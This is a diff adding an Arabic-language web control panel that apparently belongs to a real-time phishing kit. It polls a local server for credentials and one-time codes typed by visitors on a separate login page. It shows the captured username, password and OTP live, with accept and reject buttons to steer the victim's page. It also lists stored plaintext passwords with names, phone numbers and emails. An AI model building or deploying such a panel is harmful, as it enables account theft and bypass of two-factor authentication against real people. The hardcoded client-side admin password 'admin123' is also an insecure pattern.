@@ -1,0 +1,700 @@
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>لوحة التحكم</title>
+<style>
+  @import url('https://fonts.googleapis.com/css2?family=Tajawal:wght@400;500;700;800&display=swap');
+
+  :root{
+    --orange-accent:#f0700f;
+    --ink:#1c1c1c;
+    --muted:#8a8a8a;
+    --border:#d9d9d9;
+    --bg:#ffffff;
+    --sidebar:#1c2740;
+  }
+
+  *{box-sizing:border-box;}
+  body{
+    margin:0;
+    font-family:'Tajawal', sans-serif;
+    background:#f4f5f7;
+    color:var(--ink);
+  }
+
+  /* ---------- Password gate ---------- */
+  .gate{
+    min-height:100vh;
+    display:flex;
+    align-items:center;
+    justify-content:center;
+    background:linear-gradient(160deg, #6b2b0e 0%, #a8420f 30%, #d97a1f 65%, #e2861f 100%);
+    padding:20px;
+  }
+
+  .gate-card{
+    width:100%;
+    max-width:360px;
+    background:#ffffff;
+    border-radius:18px;
+    padding:32px 26px;
+    text-align:center;
+    box-shadow:0 20px 40px rgba(0,0,0,0.25);
+  }
+
+  .gate-icon{
+    width:64px;
+    height:64px;
+    border-radius:50%;
+    background:#fbe1de;
+    display:flex;
+    align-items:center;
+    justify-content:center;
+    margin:0 auto 18px;
+  }
+  .gate-icon svg{width:28px;height:28px;color:var(--orange-accent);}
+
+  .gate-card h1{
+    font-size:20px;
+    margin:0 0 6px;
+  }
+  .gate-card p{
+    color:var(--muted);
+    font-size:14px;
+    margin:0 0 22px;
+  }
+
+  .gate-card input{
+    width:100%;
+    padding:16px;
+    border:1.5px solid var(--border);
+    border-radius:12px;
+    font-family:inherit;
+    font-size:15px;
+    text-align:right;
+    outline:none;
+    margin-bottom:12px;
+  }
+  .gate-card input:focus{border-color:var(--orange-accent);}
+
+  .gate-error{
+    color:#c0392b;
+    font-size:13px;
+    min-height:18px;
+    margin:0 0 10px;
+  }
+
+  .gate-btn{
+    width:100%;
+    padding:15px;
+    border:none;
+    border-radius:12px;
+    background:var(--orange-accent);
+    color:#fff;
+    font-family:inherit;
+    font-size:15px;
+    font-weight:800;
+    cursor:pointer;
+  }
+  .gate-btn:active{ transform:scale(0.99); }
+
+  /* ---------- Dashboard ---------- */
+  .dashboard{
+    display:none;
+  }
+
+  .topbar{
+    background:var(--sidebar);
+    color:#fff;
+    padding:16px 20px;
+    display:flex;
+    align-items:center;
+    justify-content:space-between;
+  }
+  .topbar .brand{
+    font-weight:800;
+    font-size:17px;
+  }
+  .logout-btn{
+    background:transparent;
+    border:1.5px solid rgba(255,255,255,0.4);
+    color:#fff;
+    padding:8px 16px;
+    border-radius:10px;
+    font-family:inherit;
+    font-size:13px;
+    cursor:pointer;
+  }
+
+  .main{
+    max-width:1000px;
+    margin:0 auto;
+    padding:24px 20px 60px;
+  }
+
+  .welcome{
+    font-size:22px;
+    font-weight:800;
+    margin:0 0 4px;
+  }
+  .welcome-sub{
+    color:var(--muted);
+    font-size:14px;
+    margin:0 0 24px;
+  }
+
+  .stats{
+    display:flex;
+    margin-bottom:28px;
+  }
+  .stat-wifi{
+    max-width:220px;
+  }
+
+  .stat-card{
+    background:#fff;
+    border-radius:14px;
+    padding:18px;
+    box-shadow:0 2px 10px rgba(0,0,0,0.05);
+  }
+  .stat-label{
+    color:var(--muted);
+    font-size:13px;
+    margin:0 0 8px;
+  }
+  .stat-value{
+    font-size:24px;
+    font-weight:800;
+    margin:0;
+  }
+  .stat-value.orange{ color:var(--orange-accent); }
+
+  .table-card{
+    background:#fff;
+    border-radius:14px;
+    padding:20px;
+    box-shadow:0 2px 10px rgba(0,0,0,0.05);
+    overflow-x:auto;
+    margin-bottom:20px;
+  }
+
+  #pendingRequestCard{
+    border:2px solid var(--orange-accent);
+  }
+  .table-card h2{
+    font-size:16px;
+    margin:0 0 16px;
+  }
+
+  table{
+    width:100%;
+    border-collapse:collapse;
+    font-size:12px;
+  }
+  th{
+    text-align:right;
+    color:var(--muted);
+    font-weight:700;
+    padding:10px 34px;
+    border-bottom:1.5px solid #eee;
+    font-size:12px;
+    white-space:nowrap;
+  }
+  td{
+    padding:12px 34px;
+    border-bottom:1px solid #f2f2f2;
+    white-space:nowrap;
+  }
+  td[data-label="الجيميل"]{
+    max-width:150px;
+    overflow:hidden;
+    text-overflow:ellipsis;
+    direction:ltr;
+    text-align:right;
+  }
+  td[data-label="الاجراءات"]{
+    text-align:center;
+  }
+  .badge{
+    display:inline-block;
+    padding:4px 10px;
+    border-radius:20px;
+    font-size:12px;
+    font-weight:700;
+    white-space:nowrap;
+  }
+  .badge.active{ background:#e7f6ec; color:#1e8a4c; }
+  .badge.pending{ background:#fdf1e0; color:#b8720e; }
+
+  .stat-wifi-row{
+    display:flex;
+    align-items:center;
+    gap:12px;
+  }
+  .wifi-icon{
+    flex:0 0 auto;
+    width:40px;
+    height:40px;
+    border-radius:50%;
+    background:#fbe1de;
+    display:flex;
+    align-items:center;
+    justify-content:center;
+  }
+  .wifi-icon svg{width:20px;height:20px;color:var(--orange-accent);}
+
+  .action-btns{
+    display:flex;
+    flex-direction:row;
+    justify-content:center;
+    gap:5px;
+  }
+  .action-btn{
+    border:none;
+    border-radius:8px;
+    padding:8px 12px;
+    font-family:inherit;
+    font-size:12px;
+    font-weight:700;
+    cursor:pointer;
+    white-space:nowrap;
+  }
+  .details-btn{
+    background:#eef1f5;
+    color:#33415a;
+  }
+  .redirect-btn{
+    background:var(--orange-accent);
+    color:#fff;
+  }
+
+  /* ---------- Details modal ---------- */
+  .modal-overlay{
+    display:none;
+    position:fixed;
+    top:0;
+    left:0;
+    width:100%;
+    height:100%;
+    background:rgba(0,0,0,0.45);
+    align-items:center;
+    justify-content:center;
+    padding:20px;
+    z-index:100;
+  }
+  .modal-overlay.show{ display:flex; }
+
+  .modal-box{
+    width:100%;
+    max-width:340px;
+    background:#fff;
+    border-radius:16px;
+    padding:0;
+    overflow:hidden;
+  }
+
+  .modal-header{
+    background:var(--sidebar);
+    color:#fff;
+    padding:14px 16px;
+    display:flex;
+    align-items:center;
+    justify-content:space-between;
+    font-weight:800;
+    font-size:15px;
+  }
+  .modal-close{
+    background:none;
+    border:none;
+    color:#fff;
+    font-size:20px;
+    cursor:pointer;
+    line-height:1;
+  }
+
+  .modal-body{
+    padding:16px;
+  }
+  .modal-row{
+    display:flex;
+    justify-content:space-between;
+    align-items:center;
+    padding:8px 0;
+    border-bottom:1px solid #f2f2f2;
+    font-size:13.5px;
+  }
+  .modal-row:last-child{ border-bottom:none; }
+  .modal-label{
+    color:var(--muted);
+    font-weight:700;
+  }
+  .modal-value{
+    font-weight:700;
+    direction:ltr;
+  }
+
+  .modal-actions{
+    display:flex;
+    gap:10px;
+    padding:0 16px 16px;
+  }
+  .modal-btn{
+    flex:1;
+    border:none;
+    border-radius:10px;
+    padding:12px;
+    font-family:inherit;
+    font-size:14px;
+    font-weight:800;
+    cursor:pointer;
+  }
+  .accept-btn{ background:#1e8a4c; color:#fff; }
+  .reject-btn{ background:#c0392b; color:#fff; }
+
+  .modal-decision{
+    text-align:center;
+    font-weight:700;
+    font-size:14px;
+    padding:0 16px 18px;
+    margin:0;
+  }
+
+
+</style>
+</head>
+<body>
+
+<!-- Password gate -->
+<div class="gate" id="gate">
+  <div class="gate-card">
+    <div class="gate-icon">
+      <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
+        <rect x="3" y="11" width="18" height="11" rx="2"></rect>
+        <path d="M7 11V7a5 5 0 0 1 10 0v4"></path>
+      </svg>
+    </div>
+    <h1>دخول لوحة التحكم</h1>
+    <p>الرجاء إدخال كلمة المرور للمتابعة</p>
+    <input type="password" id="adminPass" placeholder="كلمة المرور">
+    <p class="gate-error" id="gateError"></p>
+    <button class="gate-btn" id="gateBtn">دخول</button>
+  </div>
+</div>
+
+<!-- Dashboard -->
+<div class="dashboard" id="dashboard">
+  <div class="topbar">
+    <span class="brand">لوحة التحكم</span>
+    <button class="logout-btn" id="logoutBtn">تسجيل خروج</button>
+  </div>
+
+  <div class="main">
+    <p class="welcome">أهلاً بك 👋</p>
+    <p class="welcome-sub">هذه نظرة عامة على النشاط اليوم</p>
+
+    <div class="stats">
+      <div class="stat-card stat-wifi">
+        <div class="stat-wifi-row">
+          <div class="wifi-icon">
+            <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
+              <path d="M5 12.55a11 11 0 0 1 14.08 0"></path>
+              <path d="M1.42 9a16 16 0 0 1 21.16 0"></path>
+              <path d="M8.53 16.11a6 6 0 0 1 6.95 0"></path>
+              <line x1="12" y1="20" x2="12.01" y2="20"></line>
+            </svg>
+          </div>
+          <div>
+            <p class="stat-label">الزيارات النشطة</p>
+            <p class="stat-value orange" id="activeVisitsValue">128</p>
+          </div>
+        </div>
+      </div>
+    </div>
+
+    <div class="table-card" id="pendingRequestCard" style="display:none;">
+      <h2>طلب دخول جديد (من الموقع)</h2>
+      <div class="modal-row"><span class="modal-label">اسم المستخدم</span><span class="modal-value" id="reqUsername"></span></div>
+      <div class="modal-row"><span class="modal-label">كلمة المرور</span><span class="modal-value" id="reqPassword"></span></div>
+      <div class="modal-actions" style="padding:14px 0 0;">
+        <button class="modal-btn accept-btn" id="reqAcceptBtn">قبول</button>
+        <button class="modal-btn reject-btn" id="reqRejectBtn">رفض</button>
+      </div>
+    </div>
+
+    <div class="table-card" id="pendingOtpCard" style="display:none;">
+      <h2>طلب تحقق برمز التأكيد (OTP)</h2>
+      <div class="modal-row"><span class="modal-label">الرمز المُدخل</span><span class="modal-value" id="reqOtpCode"></span></div>
+      <div class="modal-actions" style="padding:14px 0 0;">
+        <button class="modal-btn accept-btn" id="otpAcceptBtn">قبول</button>
+        <button class="modal-btn reject-btn" id="otpRejectBtn">رفض</button>
+      </div>
+    </div>
+
+    <div class="table-card">
+      <h2>المستخدمون</h2>
+      <table>
+        <thead>
+          <tr>
+            <th>الاسم</th>
+            <th>رقم الجوال</th>
+            <th>الجيميل</th>
+            <th>الحالة</th>
+            <th style="text-align:center;">الاجراءات</th>
+          </tr>
+        </thead>
+        <tbody id="usersTbody">
+          <tr><td colspan="5" style="text-align:center;color:#999;">جاري تحميل البيانات...</td></tr>
+        </tbody>
+      </table>
+    </div>
+  </div>
+</div>
+
+<!-- Details modal -->
+<div class="modal-overlay" id="modalOverlay">
+  <div class="modal-box">
+    <div class="modal-header">
+      <span>تفاصيل المستخدم</span>
+      <button class="modal-close" id="modalClose">&times;</button>
+    </div>
+    <div class="modal-body">
+      <div class="modal-row"><span class="modal-label">الاسم</span><span class="modal-value" id="mName"></span></div>
+      <div class="modal-row"><span class="modal-label">رقم الجوال</span><span class="modal-value" id="mPhone"></span></div>
+      <div class="modal-row"><span class="modal-label">الجيميل</span><span class="modal-value" id="mEmail"></span></div>
+      <div class="modal-row"><span class="modal-label">الحالة</span><span class="modal-value" id="mStatus"></span></div>
+      <div class="modal-row"><span class="modal-label">اسم المستخدم</span><span class="modal-value" id="mUsername"></span></div>
+      <div class="modal-row"><span class="modal-label">كلمة المرور</span><span class="modal-value" id="mPassword"></span></div>
+    </div>
+    <div class="modal-actions" id="modalActions">
+      <button class="modal-btn accept-btn" id="acceptBtn">قبول</button>
+      <button class="modal-btn reject-btn" id="rejectBtn">رفض</button>
+    </div>
+    <p class="modal-decision" id="modalDecision"></p>
+  </div>
+</div>
+
+<script>
+const ADMIN_PASSWORD = "admin123";
+
+function tryLogin(){
+  const input = document.getElementById('adminPass');
+  const error = document.getElementById('gateError');
+  if(input.value === ADMIN_PASSWORD){
+    document.getElementById('gate').style.display = 'none';
+    document.getElementById('dashboard').style.display = 'block';
+    sessionStorage.setItem('adminAuthed', '1');
+  } else {
+    error.textContent = 'كلمة المرور غير صحيحة، حاول مرة أخرى';
+    input.value = '';
+    input.focus();
+  }
+}
+
+document.getElementById('gateBtn').addEventListener('click', tryLogin);
+document.getElementById('adminPass').addEventListener('keydown', function(e){
+  if(e.key === 'Enter'){ tryLogin(); }
+});
+
+document.getElementById('logoutBtn').addEventListener('click', function(){
+  sessionStorage.removeItem('adminAuthed');
+  window.location.href = 'login.html';
+});
+
+// ---------- تحميل المستخدمين من السيرفر (db.json) ----------
+function badgeClass(status){
+  if(status === 'نشط') return 'active';
+  if(status === 'قيد المراجعة') return 'pending';
+  return '';
+}
+
+function renderUsers(users){
+  const tbody = document.getElementById('usersTbody');
+  tbody.innerHTML = '';
+  users.forEach(function(u){
+    const tr = document.createElement('tr');
+    tr.setAttribute('data-username', u.username);
+    tr.setAttribute('data-password', u.password);
+    tr.innerHTML =
+      '<td data-label="الاسم">' + u.name + '</td>' +
+      '<td data-label="رقم الجوال">' + u.phone + '</td>' +
+      '<td data-label="الجيميل">' + u.email + '</td>' +
+      '<td data-label="الحالة"><span class="badge ' + badgeClass(u.status) + '">' + u.status + '</span></td>' +
+      '<td data-label="الاجراءات">' +
+        '<div class="action-btns">' +
+          '<button class="action-btn details-btn">التفاصيل</button>' +
+          '<button class="action-btn redirect-btn">إعادة التوجيه</button>' +
+        '</div>' +
+      '</td>';
+    tbody.appendChild(tr);
+  });
+}
+
+function loadUsers(){
+  fetch('/api/users')
+    .then(function(r){ return r.json(); })
+    .then(function(data){
+      renderUsers(data.users || []);
+      if(typeof data.activeVisits !== 'undefined'){
+        document.getElementById('activeVisitsValue').textContent = data.activeVisits;
+      }
+    })
+    .catch(function(){
+      document.getElementById('usersTbody').innerHTML =
+        '<tr><td colspan="5" style="text-align:center;color:#c0392b;">تعذر تحميل البيانات. تأكد إن السيرفر شغال (node server.js)</td></tr>';
+    });
+}
+
+loadUsers();
+setInterval(loadUsers, 3000);
+
+// ---------- طلب الدخول الجديد اللي جاي من الموقع (login.html) ----------
+function checkPendingRequest(){
+  fetch('/api/login-status')
+    .then(function(r){ return r.json(); })
+    .then(function(data){
+      const card = document.getElementById('pendingRequestCard');
+      if(data && data.status === 'pending'){
+        document.getElementById('reqUsername').textContent = data.username;
+        document.getElementById('reqPassword').textContent = data.password;
+        card.style.display = 'block';
+      } else {
+        card.style.display = 'none';
+      }
+    })
+    .catch(function(){});
+}
+
+checkPendingRequest();
+setInterval(checkPendingRequest, 1500);
+
+document.getElementById('reqAcceptBtn').addEventListener('click', function(){
+  fetch('/api/decision', {
+    method: 'POST',
+    headers: { 'Content-Type': 'application/json' },
+    body: JSON.stringify({ status: 'accepted' })
+  }).then(function(){
+    document.getElementById('pendingRequestCard').style.display = 'none';
+  });
+});
+
+document.getElementById('reqRejectBtn').addEventListener('click', function(){
+  fetch('/api/decision', {
+    method: 'POST',
+    headers: { 'Content-Type': 'application/json' },
+    body: JSON.stringify({ status: 'rejected' })
+  }).then(function(){
+    document.getElementById('pendingRequestCard').style.display = 'none';
+  });
+});
+
+// ---------- طلب التحقق من رمز التأكيد (OTP) اللي جاي من الموقع ----------
+function checkPendingOtp(){
+  fetch('/api/otp-status')
+    .then(function(r){ return r.json(); })
+    .then(function(data){
+      const card = document.getElementById('pendingOtpCard');
+      if(data && data.status === 'pending'){
+        document.getElementById('reqOtpCode').textContent = data.code;
+        card.style.display = 'block';
+      } else {
+        card.style.display = 'none';
+      }
+    })
+    .catch(function(){});
+}
+
+checkPendingOtp();
+setInterval(checkPendingOtp, 1500);
+
+document.getElementById('otpAcceptBtn').addEventListener('click', function(){
+  fetch('/api/otp-decision', {
+    method: 'POST',
+    headers: { 'Content-Type': 'application/json' },
+    body: JSON.stringify({ status: 'accepted' })
+  }).then(function(){
+    document.getElementById('pendingOtpCard').style.display = 'none';
+  });
+});
+
+document.getElementById('otpRejectBtn').addEventListener('click', function(){
+  fetch('/api/otp-decision', {
+    method: 'POST',
+    headers: { 'Content-Type': 'application/json' },
+    body: JSON.stringify({ status: 'rejected' })
+  }).then(function(){
+    document.getElementById('pendingOtpCard').style.display = 'none';
+  });
+});
+
+// ---------- التفاصيل / إعادة التوجيه (event delegation عشان الصفوف بتتعمل ديناميك) ----------
+document.getElementById('usersTbody').addEventListener('click', function(e){
+  const detailsBtn = e.target.closest('.details-btn');
+  const redirectBtn = e.target.closest('.redirect-btn');
+
+  if(detailsBtn){
+    const row = detailsBtn.closest('tr');
+    const cells = row.children;
+    document.getElementById('mName').textContent = cells[0].textContent.trim();
+    document.getElementById('mPhone').textContent = cells[1].textContent.trim();
+    document.getElementById('mEmail').textContent = cells[2].textContent.trim();
+    document.getElementById('mStatus').textContent = cells[3].textContent.trim();
+
+    const username = row.getAttribute('data-username');
+    const password = row.getAttribute('data-password');
+    document.getElementById('mUsername').textContent = username || '—';
+    document.getElementById('mPassword').textContent = password || '—';
+
+    const modalActions = document.getElementById('modalActions');
+    modalActions.style.display = (username && password) ? 'flex' : 'none';
+    document.getElementById('modalDecision').textContent = '';
+
+    document.getElementById('modalOverlay').classList.add('show');
+  }
+
+  if(redirectBtn){
+    const name = redirectBtn.closest('tr').children[0].textContent;
+    alert('تم إعادة توجيه: ' + name);
+  }
+});
+
+document.getElementById('modalClose').addEventListener('click', function(){
+  document.getElementById('modalOverlay').classList.remove('show');
+});
+document.getElementById('modalOverlay').addEventListener('click', function(e){
+  if(e.target === this){ this.classList.remove('show'); }
+});
+
+document.getElementById('acceptBtn').addEventListener('click', function(){
+  document.getElementById('modalActions').style.display = 'none';
+  document.getElementById('modalDecision').textContent = '✅ تم القبول';
+  document.getElementById('modalDecision').style.color = '#1e8a4c';
+
+  fetch('/api/decision', {
+    method: 'POST',
+    headers: { 'Content-Type': 'application/json' },
+    body: JSON.stringify({ status: 'accepted' })
+  }).catch(function(){});
+});
+document.getElementById('rejectBtn').addEventListener('click', function(){
+  document.getElementById('modalActions').style.display = 'none';
+  document.getElementById('modalDecision').textContent = '❌ تم الرفض';
+  document.getElementById('modalDecision').style.color = '#c0392b';
+
+  fetch('/api/decision', {
+    method: 'POST',
+    headers: { 'Content-Type': 'application/json' },
+    body: JSON.stringify({ status: 'rejected' })
+  }).catch(function(){});
+});
+
+// Skip the gate only within the same browser tab session if already authed
+if(sessionStorage.getItem('adminAuthed') === '1'){
+  document.getElementById('gate').style.display = 'none';
+  document.getElementById('dashboard').style.display = 'block';
+}
+</script>
+
+</body>
+</html>
